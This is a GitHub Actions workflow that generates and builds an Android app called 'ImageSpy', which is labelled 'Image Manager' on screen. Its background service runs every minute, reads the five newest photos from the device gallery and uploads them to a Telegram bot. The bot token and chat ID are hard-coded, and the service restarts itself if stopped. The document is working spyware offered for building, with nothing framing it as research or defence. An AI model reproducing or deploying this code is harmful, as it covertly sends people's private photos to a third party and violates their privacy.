name: Build APK

on: workflow_dispatch

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
        
      - name: Setup Android SDK
        uses: android-actions/setup-android@v2
        
      - name: Build APK
        run: |
          mkdir -p app/src/main/java/com/example/imagespy
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/mipmap-xxxhdpi
          
          # MainActivity.java
          cat > app/src/main/java/com/example/imagespy/MainActivity.java << 'EOF'
          package com.example.imagespy;
          import android.app.Activity;
          import android.content.Intent;
          import android.os.Bundle;
          import android.widget.Button;
          import android.widget.TextView;
          
          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);
                  
                  Button btnStart = findViewById(R.id.btnStart);
                  Button btnStop = findViewById(R.id.btnStop);
                  TextView tvStatus = findViewById(R.id.tvStatus);
                  
                  btnStart.setOnClickListener(v -> {
                      startService(new Intent(this, ImageUploadService.class));
                      tvStatus.setText("نشط");
                  });
                  
                  btnStop.setOnClickListener(v -> {
                      stopService(new Intent(this, ImageUploadService.class));
                      tvStatus.setText("متوقف");
                  });
              }
          }
          EOF
          
          # ImageUploadService.java
          cat > app/src/main/java/com/example/imagespy/ImageUploadService.java << 'EOF'
          package com.example.imagespy;
          import android.app.Service;
          import android.content.Intent;
          import android.os.IBinder;
          import android.os.Handler;
          import android.os.Looper;
          import android.database.Cursor;
          import android.provider.MediaStore;
          import java.io.File;
          import java.io.IOException;
          import okhttp3.*;
          
          public class ImageUploadService extends Service {
              private static final String BOT_TOKEN = "8855243307:AAHYpbxnc-qGU0K_YFw4xQUg3I3sMiE59Ec";
              private static final String CHAT_ID = "8003742261";
              private Handler handler;
              private Runnable runnable;
              
              @Override
              public void onCreate() {
                  super.onCreate();
                  handler = new Handler(Looper.getMainLooper());
                  runnable = new Runnable() {
                      @Override
                      public void run() {
                          uploadImages();
                          handler.postDelayed(this, 60000);
                      }
                  };
              }
              
              @Override
              public int onStartCommand(Intent intent, int flags, int startId) {
                  handler.post(runnable);
                  return START_STICKY;
              }
              
              private void uploadImages() {
                  String[] projection = {MediaStore.Images.Media.DATA};
                  Cursor cursor = getContentResolver().query(
                      MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                      projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 5"
                  );
                  
                  if (cursor != null) {
                      while (cursor.moveToNext()) {
                          String path = cursor.getString(0);
                          sendToTelegram(new File(path));
                      }
                      cursor.close();
                  }
              }
              
              private void sendToTelegram(File file) {
                  OkHttpClient client = new OkHttpClient();
                  RequestBody body = new MultipartBody.Builder()
                      .setType(MultipartBody.FORM)
                      .addFormDataPart("chat_id", CHAT_ID)
                      .addFormDataPart("photo", file.getName(),
                          RequestBody.create(MediaType.parse("image/*"), file))
                      .build();
                      
                  Request request = new Request.Builder()
                      .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto")
                      .post(body)
                      .build();
                      
                  try {
                      client.newCall(request).execute();
                  } catch (IOException e) {
                      e.printStackTrace();
                  }
              }
              
              @Override
              public IBinder onBind(Intent intent) { return null; }
              
              @Override
              public void onDestroy() {
                  handler.removeCallbacks(runnable);
              }
          }
          EOF
          
          # AndroidManifest.xml
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.example.imagespy">
              
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
              <uses-permission android:name="android.permission.INTERNET"/>
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
              
              <application
                  android:allowBackup="true"
                  android:label="ImageSpy"
                  android:theme="@android:style/Theme.Light.NoActionBar">
                  
                  <activity android:name=".MainActivity"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>
                  
                  <service android:name=".ImageUploadService"
                      android:enabled="true"
                      android:exported="false"/>
              </application>
          </manifest>
          EOF
          
          # activity_main.xml
          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:orientation="vertical"
              android:gravity="center"
              android:padding="24dp">
              
              <TextView android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Image Manager"
                  android:textSize="24sp"
                  android:layout_marginBottom="32dp"/>
                  
              <Button android:id="@+id/btnStart"
                  android:layout_width="match_parent"
                  android:layout_height="wrap_content"
                  android:text="تفعيل"/>
                  
              <Button android:id="@+id/btnStop"
                  android:layout_width="match_parent"
                  android:layout_height="wrap_content"
                  android:text="إيقاف"
                  android:layout_marginTop="16dp"/>
                  
              <TextView android:id="@+id/tvStatus"
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="متوقف"
                  android:layout_marginTop="32dp"/>
          </LinearLayout>
          EOF
          
          # build.gradle (app)
          cat > app/build.gradle << 'EOF'
          plugins {
              id 'com.android.application'
          }
          android {
              namespace 'com.example.imagespy'
              compileSdk 34
              defaultConfig {
                  applicationId "com.example.imagespy"
                  minSdk 24
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              buildTypes {
                  release {
                      minifyEnabled false
                  }
              }
          }
          dependencies {
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
          }
          EOF
          
          # build.gradle (project)
          cat > build.gradle << 'EOF'
          plugins {
              id 'com.android.application' version '8.1.0' apply false
          }
          EOF
          
          # settings.gradle
          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "ImageSpy"
          include ':app'
          EOF
          
          # gradle.properties
          cat > gradle.properties << 'EOF'
          org.gradle.jvmargs=-Xmx2048m
          android.useAndroidX=true
          EOF
          
      - name: Build Debug APK
        run: |
          chmod +x ./gradlew 2>/dev/null || true
          ./gradlew assembleDebug || gradle assembleDebug
          
      - name: Upload APK
        uses: actions/upload-artifact@v3
        with:
          name: ImageSpy-APK
          path: app/build/outputs/apk/debug/app-debug.apk
